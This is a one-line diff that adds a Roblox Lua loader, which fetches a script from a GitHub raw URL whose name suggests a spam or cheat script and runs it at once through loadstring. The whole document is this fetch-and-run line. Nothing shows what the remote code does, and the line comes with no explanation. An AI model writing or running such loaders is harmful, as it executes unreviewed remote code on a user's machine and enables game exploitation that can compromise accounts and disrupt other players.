@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/electricity-bricklayer-spam0-ymu551kxm08jed.lua"))()
